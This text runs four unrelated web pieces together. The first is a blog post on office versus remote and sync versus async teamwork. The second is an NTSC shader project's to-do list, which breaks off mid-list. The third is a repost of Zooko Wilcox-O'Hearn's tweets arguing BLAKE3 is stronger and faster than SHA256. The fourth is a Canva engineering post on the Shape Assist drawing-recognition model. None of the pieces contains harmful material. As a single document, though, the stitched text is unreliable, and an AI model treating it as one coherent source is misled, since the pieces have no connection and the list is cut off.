<p>Rather, successful companies maximise what their people can achieve. One factor is indeed how talented the people who join are. Another is their pre-existing skills. Even more significant than these is the extent to which the organisation amplifies &amp; accelerates, or impedes their abilities.&nbsp;&nbsp;</p>



<figure></figure>



<p>Different organisations, and different ways of working, are more or less suited to make different individuals the most effective.&nbsp;&nbsp;</p>



<h2 id="nocompromise">Don’t Compromise</h2>



<p>Mediocre teams compromise on their ways of working to avoid conflict; sacrificing their team’s potential on the altar of individual autonomy.&nbsp;</p>



<p>Effective teams find ways of working that give themselves an advantage. They shape their environment to maximise their effectiveness.&nbsp;</p>



<figure><blockquote><p><em>Mediocre teams compromise on their ways of working to avoid conflict; sacrificing their team’s potential on the altar of individual autonomy.&nbsp;</em></p></blockquote></figure>



<p>Hybrid work policies can easily result in the downsides of being anchored to an office location, with none of the benefits that could come from having everyone together. </p>



<p>It doesn’t just happen with location. Individual preferences for working exclusively in certain parts of the codebase can result in nobody working together towards the same mission. People who feel they get more done if left to their own devices for days or weeks are often right, <em>and</em> it can also be true that the team as a whole is less successful. </p>



<p>It’s easy to avoid conflict and get stuck in mediocrity. Optimising for individual happiness can result in less of the joy that people find in teams that achieve great things together.</p>



<figure><blockquote><p><em>Optimising for individual happiness can result in less of the joy that people find in teams that achieve great things together.</em></p></blockquote></figure>



<p>If only effective collaboration had such an easy answer as asking everyone to come to an office.&nbsp;</p>



<p>If you want to build up your teams rather than undermine them, start with curiosity about <em>how </em>they work. Invite and support them to uncover better ways of working for them. What helps them. Their preferences. Their lives. Their mission. Their constraints.</p>



<p>I’m privileged to have experienced working with many effective &amp; ineffective teams &amp; communities. Both in office environments and remotely, with a variety of collaboration styles.</p>



<p>I’ve experienced some of my most joyful work in teams working together in the same space. I’ve benefited from flexibility and inclusion with remote work. I’ve also been able to contribute as part of larger open source communities where I couldn’t even know everyone by name. There are plenty of reasons to be passionate about each approach.&nbsp;</p>



<p>What I am <em>most</em> passionate about is teams finding the most effective ways to work together. Joy for the individuals involved. Successful team missions. Turning the constraints they’re working with to their advantage.</p>



<h2 id="beyondbinary">Beyond a Binary Debate</h2>



<p>There are more options than just Office vs Remote. Distributed vs Co-located working is often conflated with Async vs Synchronous working styles. It’s not one or the other.</p>



<figure><img loading="lazy" width="1455" height="1194" src="https://benjiweber.co.uk/blog/wp-content/uploads/2023/11/quadrants-1.png" alt=""></figure>



<p>By Async I mean working independently. Coordinating via tickets, pull requests, mailing lists etc.&nbsp;</p>



<p>By Sync I mean working together, on the same thing, at the same time—and <em>not necessarily</em> at the same place.&nbsp;&nbsp;</p>



<p>Those who’ve experienced greatness at one extreme on this chart are often enthusiastic. Top-right and bottom-left have many proponents. However, bottom right can be glorious as well, and this seems to be less discussed.&nbsp;Fans of Async-Remote sometimes characterise Sync-Remote as being<em> “unable to let go of the office”</em>. However, I’ve seen it work tremendously well—often far better than the typical office space allows.&nbsp;</p>



<p>Teams often compromise somewhere near the middle. A hybrid of workplaces and work-ways. Accommodating a variety of preferences and needs.&nbsp;</p>



<p>The best teams I’ve seen move towards an edge and find a sweet spot. You can imagine a third dimension of effectiveness. With a pit in the centre.</p>



<figure><img src="https://lh7-us.googleusercontent.com/7N0jyimRlpT3b6X1zF-O0qKvqdLmurkeBONV9UhITfJgwUJQf0c_1PUwCnO8dXLeuTlxWSFUx1V6r818JY9dw5q4tyXkghX_91dVTSSFoWT3de2rzrixBoVllmoVkrDiXbz2AeO_DcoGGqHr8PkXeRE" alt=""></figure>



<h2 id="officeasync">Office and Async — Escape the Tragedy</h2>



<p>I’ve not found a scenario where this quadrant is better than an alternative, despite it being, in my experience, the most common for most <em>“teams”</em>. Where teams are acting more like a mere convenient grouping of individuals than a collective with a common mission.</p>



<figure><img loading="lazy" width="856" height="472" src="https://benjiweber.co.uk/blog/wp-content/uploads/2023/11/headphones.png" alt=""></figure>



<figure><blockquote><p><em>Don’t suffer and merely survive, aided by your noise cancelling headphones.</em></p></blockquote></figure>



<p>This scenario often arises through compromise on ways of working that are the least objectionable to everyone in the team. In contrast, better ways of working tend to arise from finding what works and <a href="https://benjiweber.co.uk/blog/2015/04/17/modern-extreme-programming/">turning it up to the extreme</a>.</p>



<p>I’m interested to hear from you if you have seen a team better off in the Office &amp; Async quadrant than they would be in another. </p>



<p>If you’re stuck in this quadrant, and you’re not finding it joyful, consider a move to another. Don’t suffer and merely survive, aided by your noise cancelling headphones.</p>



<figure><img loading="lazy" width="1636" height="1193" src="https://benjiweber.co.uk/blog/wp-content/uploads/2023/11/escape.png" alt=""></figure>



<h3>Option 1: Move remote, to get the true benefits of Async&nbsp;</h3>



<p>If you have the luxury of working remotely, and you prefer working asynchronously, then remote will open up lots of benefits.</p>



<p>You’ll avoid commutes. You’ll enable hiring from anywhere, including a wide geographical spread, making it easier to hire great people. You’ll increase timezone coverage for progress that never stops and improve operational coverage.&nbsp;</p>



<h3>Option 2: Move together, to enable Sync</h3>



<p>If your team are all spread out within the same office, bring your desks together. Control your space as much as possible. Use the wall space. Separate your area with whiteboards / soundproofing. </p>



<p>If this isn’t possible, consider booking meeting rooms out where you could go to work together. It’s amazing how infrequently large meetings get questioned. Whereas making small changes to enhance the space you’re working in sometimes alarms bureaucracies. </p>



<p>Working in the same space will enable ad-hoc discussions. It facilitates pair programming with regular rotations. You can make the things most important to you visible in the workspace. You’ll also overhear opportunities to help each other.</p>



<h3>Option 3: Move remote, to enable Sync&nbsp;</h3>



<p>If you can’t move your desks but have the luxury of working remotely, you could move to the bottom right to make collaboration easier. Then try some of the ways of working <a href="#officesync">mentioned below.</a></p>



<h2 id="remoteasync">Remote and Async — Open Source Style</h2>



<p>Many of the best ways of working in this quadrant have emerged from the ways that distributed open source communities work. Pull requests. Mailing lists. Decision frameworks based on written proposals.&nbsp;</p>



<p>This style enables large groups of people to collaborate effectively to&nbsp;achieve large things. Often larger than a traditional team could achieve. Sometimes at the cost of speed of decisions.&nbsp;</p>



<h2 id="officesync">Office and Sync — XP Style</h2>



<p><a href="https://en.wikipedia.org/wiki/Extreme_programming_practices">Extreme Programming Practices</a> are a great starting point for office &amp; sync. Then experiment and iterate towards what works best for you.</p>



<p>If you have the luxury of being in the same space—be in the same space. i.e. get your desks together. Get big desks so you can sit and work together. Customise your space to be informative &amp; facilitate collaboration. Track things on the walls. Keep living diagrams on whiteboards. Put up big displays with production metrics.&nbsp;</p>

<h2>Remote and Sync — Learn what works</h2>



<p>Less has been written about this quadrant. Kent Beck <a href="https://www.mechanical-orchard.com/post/is-extreme-collaboration-remotely-possible">wrote this article recently</a> which partly inspired this post.&nbsp;</p>



<p>During the pandemic I saw several teams stuck in the Async-Colocated quadrant discover the benefits of collaborative practices.&nbsp;</p>



<figure><blockquote><p><em> re-discovery of XP practices unimpeded by hostile offices</em></p></blockquote></figure>



<p>Teams stuck working as isolated individuals within the same office were freed. Absent the noisy office environments where they were artificially separated, they could start working together, in a remote-first way.&nbsp;</p>



<p>Teams discovered new ways. These included re-discovery of XP practices unimpeded by hostile offices.</p>



<h3>Eliminate wasteful Meetings</h3>



<p>I saw teams inverting what they used synchronous time for. Things they did together through mere habit, like status updates for stakeholders, became async. Boring meetings of status updates that could be slack messages became slack messages.&nbsp;</p>



<p>Instead, sync time was protected for actual collaboration. The higher cost of sync time when remote due to lower bandwidth incentivised using it more wisely.&nbsp;</p>



<h3>Always-on Zoom</h3>



<p>An always-on video call for teams allowed people to drop in and out to work with each other and catch up on work others were doing in parallel. Analogous to a dedicated team war-room in an office. Without the bureaucratic hurdles to setting one up. Nor the challenge of competing with nearby teams for noise.</p>



<h3>Dashboard Nudges&nbsp;</h3>



<p>Automated daily screenshots of dashboards with team KPIs. Regular snapshots sent to teams’ Slack channels replaced the physical TVs from the physical office. These nudges provoked conversation,  increasing awareness of both the success of features, and production risks.&nbsp;</p>



<h3>Team Games</h3>



<p>Opportunities to relax and have fun together needed to be intentional. Web based multi-player remote games were a go-to for several teams.</p>



<h3>Virtual Whiteboarding</h3>



<p>Discussions and brainstorms sometimes worked even better than their in-person alternatives. Unlike physical whiteboards, in virtual space there’s no problems with everyone crowding around. Nobody can hog the view. Everyone can participate at once. Not to mention saving a fortune in post-it notes.&nbsp;</p>



<h3>Pair Programming&nbsp;</h3>



<p>Pair programming works well when remote. For many teams it works <em>better</em> remotely; their office environments being so hostile to in-person collaboration. No longer having to compete with the din, pairs could focus. </p>



<p>Communication bandwidth isn’t as high as in-person, but the tooling to work together remotely has come a long way. Tools like VSCode <a href="https://code.visualstudio.com/learn/collaboration/live-share">Live-share</a>, and <a href="https://tuple.app/">Tuple</a> make working together a breeze. Tooling like <a href="https://github.com/remotemobprogramming/mob">mob</a> enables fast handover.&nbsp;&nbsp;</p>



<h3>Continuous Integration</h3>



<p>True continuous integration (integrating to main multiple times per day) is even more valuable when you don’t have the opportunity to overhear what others are working on.</p>



<figure></figure>



<h2>Serendipity is not a Strategy</h2>



<p>All quadrants&nbsp;benefit from intentionally defining and writing down ways of working, rather than relying on accidental interactions and happenstance in an office.</p>



<p>Don’t rely on watercooler moments.</p>



<p>If you want folks to have unstructured conversations from which new ideas might emerge, create those opportunities intentionally. There are lots of mechanisms to increase luck and the chances of useful conversations occurring.&nbsp;e.g. No-pre-planned meeting days. Blocked lunch breaks. Group volunteering. Team meals. Quarterly Offsites. Retrospectives.&nbsp;</p>



<p>Look for what’s working for your team and turn it up. Try changing things and uncovering better ways of working!</p>

<p dir="auto">Some things that are on the list to do at some point:</p>
<ul dir="auto">
<li>Add more preset NTSC timing data (for instance, get the timings for Sega Genesis games, so that emulators will get that classic rainbow-like waterfall effect in Sonic)</li>
<li>Add additional input types (not just RGB)
<ul dir="auto">
<li>The NES outputs in effectively 9-bit color (6 bits of color palette space plus 3 bits for "color emphasis"), and the signal can be generated direct from that</li>
<li>CGA cards had two different modes of generating a composite signal, and to truly get accurate colors for composite artifact color tricks that old PC games like Maniac Mansion used, the signal would have to be generated in the same way</li>
</ul>
</li>
<li>Add ability to decode a real NTSC signal - Rather than using the Generator shaders to create NTSC scanlines, it's absolutely possible to take a true NTSC signal, slice it up into scanlines, and then run it directly into the Decoder shaders
<ul dir="auto">
<li>This would likely require a resampler from whatever the input rate is into one where the color carrier frequency is a nice even value like 4 or 8 texels (the generator by default uses 4).</li>
<li>Additionally detecting the various different ways that devices generated their scanlines, both for standard interlaced signals and the "240p" modes that consoles tended to use.</li>
<li>This is code that I have half-working using the output of an oscilloscope that I can hook a console up to, but it's sort of hacked together at the moment.</li>
</ul>
</li>
<li>Integration into some existing emulators
<ul dir="auto">
<li>It's totally possible to get these into something like <a href="https://www.retroarch.com/" rel="nofollow">RetroArch</a>, but it's not <em>quite</em> as easy as just dropping the shaders in, requiring a little bit of redo on some of the shaders (one in particular is intended to run once for any given output screen resolution as it would be expensive to run every frame).</li>

    <p>This post is a copy of <a href="https://twitter.com/zooko/status/1652743779932045313">tweets</a> by <a href="https://en.wikipedia.org/wiki/Zooko_Wilcox-O%27Hearn">Zooko Wilcox-O'Hearn</a>.</p>
<p>SHA256 was designed by the NSA. BLAKE (the original) and BLAKE3 were designed by Jean-Philippe Aumasson and others (including me, but Jean-Philippe and the other contributors did a lot more of the cryptographic heavy lifting than I did).</p>
<p>SHA256 was based on SHA1 (which is weak). BLAKE was based on ChaCha20, which was based on Salsa20 (which are both strong).</p>
<p>NIST/NSA have repeatedly signaled lack of confidence in SHA256: first by hastily organising the SHA3 contest in the aftermath of Wang's break of SHA1, then by making "Don't be like SHA256" a goal for the algorithms of that contest, and then by banning SHA256 from new designs to be used by the USA government (except for in one specific cryptosystem that protects from weaknesses in the hash function <a href="https://media.defense.gov/2022/Sep/07/2003071836/-1/-1/0/CSI_CNSA_2.0_FAQ_.PDF">https://media.defense.gov/2022/Sep/07/2003071836/-1/-1/0/CSI_CNSA_2.0_FAQ_.PDF</a>).</p>
<p>BLAKE (the original) was very well-studied during the SHA3 competition. In NIST's final report on the SHA3 process, they stated that the depth of scientific analysis applied to BLAKE exceeded even that applied to Keccak (the final SHA3 winner).</p>
<p><img src="https://peergos.org/theme/img/blog/blake3-analysis.jpeg"></p>
<p>Known, feasible attacks can break 31 out of 64 rounds of SHA256 (48% of the rounds). Known, feasible attacks can break only 2 out of 7 rounds of BLAKE3 (29% of the rounds).</p>
<p>BLAKE3 comes “out of the box” with security features that can protect users in common use cases, such as protection against length-extension attack, a standard method of keying, "personalization tags" to guarantee domain separation, etc.</p>
<p>BLAKE3 is <em>much</em> more efficient (in time and energy) than SHA256, like 14 <em>times</em> as efficient in typical use cases on typical platforms.</p>
<p><img src="https://peergos.org/theme/img/blog/blake3-performance.jpeg"></p>
<p>BLAKE3 also offers performance that is competitive against SHA256 in a lot of different use cases and platforms, including some that might surprise you, such as sometimes being more efficient than SHA256 <em>even</em> when your CPU comes with SHA256 acceleration circuits built into it!</p>
<p>BLAKE3 is highly parallelizable. This provides two performance advantages, only the first of which most people think about.</p>
<ul>
<li>
<p>The first is big data + big multicore: if the size of your data inputs scale up 100X but the number of CPU cores in your platform also scale up 100X, BLAKE3 takes only a little longer, but SHA256 takes approximately 100X times as long.</p>
</li>
<li>
<p>The other advantage, less widely understood, is that inside a single compute device, new tech improvements provide more and more parallel power. This is true in FPGAs and GPUs, and it is true in CPUs because of vectorization upgrades.</p>
</li>
</ul>
<p>AVX in Intel/AMD, Neon and Scalable Vector Extensions in Arm, and RISC-V Vector computing in RISC-V. BLAKE3 can take advantage of all of it.</p>
<p>When you upgrade to a newer CPU/platform/device, BLAKE3 typically <em>further extends</em> its performance advantage over SHA256 compared to the performance advantage it already had on the previous platform!</p>
<p>Finally, BLAKE3 was designed and implemented by both cryptographers <em>and</em> software engineers. The reference implementations are super efficient and well-engineered for security, thanks to Jack O'Connor, Samuel Neves, and Jean-Philippe Aumasson: <a href="https://github.com/BLAKE3-team/BLAKE3">https://github.com/BLAKE3-team/BLAKE3</a></p>

<div id="readability-page-1" class="page"><div data-page-content="true"><h2 id="introduction">Introduction</h2>
<p>Millions of Canva users worldwide have unleashed their creativity with our new <a target="_new" href="https://www.canva.com/draw/">Draw tool</a>,
which lets you add customized drawings to your design to make them stand out. However, if
you’re anything like us, even a simple straight line drawn with a mouse or a trackpad can end
up looking like a path trod by a tipsy squirrel. Don’t even get us started on circles and rectangles.
So when we set out to plan the draw tool, we knew we’d need to lend a hand to those of us lacking
surgeon levels of steadiness. So we built Shape Assist, which uses machine learning (ML) to turn a
shaky scribble into a sleek vector graphic (you can thank us later).</p>
<figure><span><span></span><img alt="A video showing Shape Assist in action" loading="lazy" width="2324" height="1310" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/shape_assist.1fd8459c.gif"><span></span></span><figcaption>Shape Assist in action</figcaption></figure>
<h2 id="design-considerations">Design considerations</h2>
<p>In developing the feature, we kept classification latency at the forefront of our minds. We wanted
to make sure the experience was snappy but still accurate. Therefore, we decided to deploy the solution
in the browser, which allows for real-time shape recognition and drawing assistance, providing a seamless
and interactive user experience. Users can draw shapes and receive immediate feedback without experiencing
delays associated with server-based processing. This enhances the overall usability and responsiveness of
the shape assist tool, making it more enjoyable and efficient for users.</p>
<p>Furthermore, running the shape assist ML model in the browser eliminates the need for continuous internet connectivity,
making it accessible even in offline scenarios. People can use the shape assist tool without depending on internet
connectivity, which can be especially useful in situations with limited or unreliable internet access.</p>
<p>In the initial development of Shape Assist in Canva, we used computer vision heuristics to identify and recognize
shapes drawn by users. We based these heuristics on pre-defined rules and thresholds to detect specific shapes, such as
rectangles, circles, and triangles, by analyzing geometric properties of the cartesian coordinates of the points. While
this approach provided some basic shape recognition capabilities, it had limitations when adding new shapes or handling
more complex shapes. While we had already decided to limit the initial implementation to shapes people could draw with
a single stroke, our proposed shape list included some that were too complex for our initial approach to handle (like
clouds, stars, and hearts).</p>
<p>To overcome these limitations and provide a more versatile and accurate shape recognition system, we decided to switch
to an ML model. ML models can learn from a large dataset of user-drawn shapes and can adapt and generalize to new
shapes, styles, and variations. This allowed us to expand the capabilities of shape assist beyond simple geometric
shapes to more complex and custom shapes, making it a more robust and flexible tool for users.</p>
<p>We designed the feature to replace the shape drawn by a user if they held down the cursor in place for at
least a second after drawing. However, we also wanted to be able to keep the shape as is, without automatic replacement,
if it didn't closely match any of the predefined classes.</p>
<p>Developing the ML model for Shape Assist involved several key steps. First, we collected a large dataset of user-drawn
shapes, capturing a wide range of styles and variations. Next, we used the heavily augmented dataset to train a neural
network, with preprocessing to handle user drawing style differences. Finally, we deployed the ML model in the browser
using customized inference code to minimize the bundle footprint. The result is a super snappy feature that accurately
identifies shapes drawn by different users.</p>
<h2 id="gathering-the-data">Gathering the data</h2>
<p>As all ML Engineers will know, the basis for a successful ML model is data, so we paid special attention
to collecting and curating our dataset. We wanted to make sure Shape Assist would be delightful to diverse users,
so we collected drawing data from anyone who agreed to sit still long enough to hold a mouse. We invited intrepid
Canvanauts to unleash their creative spirit and draw single-stroke shapes in a simple user interface. We recorded
the strokes made by users as a series of x and y coordinates, which allowed us to collect a diverse set of user-generated
data, with each shape represented as a sequence of coordinates.</p>
<p>Using coordinates to record the strokes provided us with the flexibility to preprocess the data and perform various
data augmentation techniques, further improving the model's ability to generalize. If the shapes were recorded as
binary images rather than x and y coordinates, then spatial augmentations such as flipping, rotating and shearing could
be applied. But by recording the data as coordinates we can also apply augmentations such as random deletion of
coordinates, random jittering of point location, reversal of point order, among others.</p>
<p>Canvanauts love a chance to get involved and help out other teams, so even just from volunteer efforts, we managed to
collect a sizeable dataset. However, we quickly learned that our engineers and designers aren’t very representative of
the average Canva user. For example, ML engineers have a penchant for providing adversarial data, and our designers are
so talented we could probably sell their doodles (we even instructed some to draw with their non-dominant hand to make
it fairer for the rest of us mere mortals). Thankfully, after providing some stricter guidelines and expectations,
we obtained a sizeable dataset.</p>
<h2 id="designing-and-training-the-model">Designing and training the model</h2>
<p>Since we wanted the ML model to run client-side, and we didn't want to have a detrimental impact on page load
time, we needed to keep the size of the model to a minimum. Therefore, instead of using a <a target="_new" href="https://cs231n.github.io/convolutional-networks/">Convolutional
Neural Network (CNN)</a> that required converting the
points into pixels, we decided to experiment with a <a target="_new" href="https://cs231n.github.io/rnn/">Recurrent Neural Network (RNN)</a>,
which directly used the strokes' x and y coordinates.</p>
<figure><span><span></span><img alt="Comparison of the Cartesian coordinate system versus pixels in varying resolutions" loading="lazy" width="2006" height="660" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/coordinate_systems.8c700172.png"><span></span></span><figcaption>To accurately represent the shape in pixels, we required approximately 20x20 pixels. This results in a
large, sparse image or vector (400 elements). However, using Cartesian
coordinates, we found we could use far fewer elements while still maintaining good performance.</figcaption></figure>
<p>To identify the optimal model attributes, we performed a hyperparameter sweep, tweaking various parameters such as
input size, number of layers, and number of features in the hidden state. We tried different combinations to find
the sweet spot for our Shape Assist model.</p>
<p>One challenge we encountered while developing the Shape Assist model was that different users draw at different
speeds. This resulted in varying lengths of the list of points describing a given shape, with more points in the
list for users who draw slowly than those who draw quickly. To ensure the model could generalize well to different
drawing speeds, we needed to fix the number of points representing each shape. While we could use piecewise linear
interpolation to evenly distribute points, we found this approach tended to remove key points, resulting in a loss of
important detail. Instead, we developed a variation on the <a target="_new" href="https://en.wikipedia.org/wiki/Ramer%E2%80%93Douglas%E2%80%93Peucker_algorithm">Ramer-Douglas-Peucker (RDP) algorithm</a>,
which is a curve simplification algorithm that reduces the number of points in a curve while preserving its important details.
It achieves this by recursively removing points that deviate insignificantly from the simplified version of the curve.</p>
<figure><span><span></span><img alt="Comparison of data points: from left to right, the original, simplified data points using linear interpolation
and RDP simplification" loading="lazy" width="1980" height="712" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/rdp.2a62e7e5.png"><span></span></span><figcaption>Original data points versus simplified data using
linear interpolation versus RDP simplification. RDP simplification maintains high-frequency
details (such as the sharp corner circled in the image), while linear interpolation can erase
these important details.</figcaption></figure>
<p>Adding to the complexity of training the model, we knew that we wanted the option of rejecting the model prediction
if the shape didn't closely resemble one of the predefined classes.</p>
<p>Given that only one shape could be correct at a time, a softmax activation function, combined with a
<a target="_new" href="https://en.wikipedia.org/wiki/Cross-entropy">cross-entropy</a> loss, was the obvious choice. We could reject the
prediction if the confidence associated with the highest-probability
class was below a given threshold. However, we found that this approach led to models with high confidence, even when
wrong. Therefore, we opted instead to train the model as a multi-class multi-label classifier, using sigmoid activation
functions on each output class, and rejecting the prediction if no classes were above a given threshold.</p>
<p><span><span></span><img alt="" loading="lazy" width="1972" height="936" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/softmax.dcc2311b.png"><span></span></span></p>
<figure><span><span></span><img alt="Illustration of why the softmax activation function is not used. Here the model is overly confident on circle, when it
is not." loading="lazy" width="2002" height="856" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/sigmoid.84da85b5.png"><span></span></span><figcaption>Using a softmax activation function results in an overly confident model
even when wrong. We achieved better performance with sigmoid activation functions for all classes
followed by thresholding.</figcaption></figure>
<h2 id="deployment-trade-offs">Deployment trade-offs</h2>
<p>Once we had decided on the appropriate architecture and carefully trained the model, it was time to put it in the
hands of our users. Often ML models are large and computationally intensive, so they live on powerful (expensive)
computers in the cloud.</p>
<p>As it turns out, our model is pretty small and contains only a few mathematical operations, which allowed us to
consider running all the processing inside the client application. With this approach, we eliminated the need for
a connection to the server - the feature works entirely offline. As a bonus, eliminating the round-trip time to the
server means that we recognize shapes almost instantaneously.</p>
<h2 id="model-architecture">Model architecture</h2>
<p>So, exactly how big is the model, and what operations does it do? Let’s draw it (with itself)!</p>
<figure><span><span></span><img alt="Model, which consists of an LSTM and a Gemm." loading="lazy" width="1942" height="808" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/model.11478cd7.png"><span></span></span><figcaption>The model architecture, drawn
with the help of Shape Assist.</figcaption></figure>
<p>From these beautifully polished rectangles and arrows, you can see that we arrived at a
structure consisting of a single Long Short Term Memory (LSTM) layer, followed by a General Matrix Multiply
(Gemm, also known as a Dense or Fully Connected layer).</p>
<p>This diagram shows some important configuration variables:</p>
<ul>
<li>Number of interpolated points: <code>P = 25</code></li>
<li>Hidden size: <code>H = 100</code></li>
<li>Number of predefined shapes: <code>N = 9</code></li>
</ul>
<p>Using these values, we can derive the total number of parameters:</p>
<ul>
<li>LSTM: <code>4H * 2 + 4H * H + 8H = 41,600</code></li>
<li>Gemm: <code>P * H * N + N = 22,509</code></li>
<li><strong>Total</strong>: <code>64,109</code></li>
</ul>
<p>With 4 bytes per parameter (IEEE754 32 bit floating point), the model is roughly 250 kilobytes in size, approximately
equivalent to a single uncompressed 360p 16:9 image. We can potentially bring this down even further by storing the
parameters at a lower precision.</p>
<p>To run the model on the client, we needed a way of performing the LSTM and Gemm operations. Instead of using a
general-purpose ML engine for this, we elected to build them from scratch directly in Typescript. While this approach
doesn't generalize well to more complex models, it did allow us to deliver this feature quickly while keeping our
options open for more sophisticated kinds of processing in the future. The resulting implementation is less than
300 lines long and runs in under 10 milliseconds on a modern laptop (about ten times faster than you can blink!).</p>
<h2 id="shape-replacement">Shape replacement</h2>
<p>After using the model to determine what shape a user drew, we used a template-matching approach to accurately
align the user-drawn path with a vector-graphic representation. This involves normalizing both the input shape and
template shape, trying 15° rotations of the template shape, computing the first and second moments of the input points
in the rotated coordinate space, and calculating dissimilarity between the input points and the template shape.
The rotation with the smallest dissimilarity is selected as the optimal angle.</p>

<h2 id="conclusion">Conclusion</h2>
<p>We’re super stoked to be able to share this feature with the world. We had a lot of fun building it,
and whether you’re an expert designer or a scribbler, we hope you enjoy the extra sparkle it can bring to your creations.</p>
